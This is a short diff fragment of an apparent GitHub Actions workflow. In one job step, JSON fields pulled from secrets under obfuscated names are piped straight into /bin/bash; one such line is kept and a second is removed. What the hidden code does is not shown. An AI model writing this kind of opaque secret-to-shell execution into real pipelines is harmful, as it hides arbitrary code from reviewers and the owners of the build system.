@@ -22,7 +22,6 @@ jobs:
           d5: ${{ secrets.d5 }}
         run: |
           printf '%s' "$d5" | jq -r .xrjv861 | /bin/bash
-          echo $bt0765 | jq -r .dqn6938 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
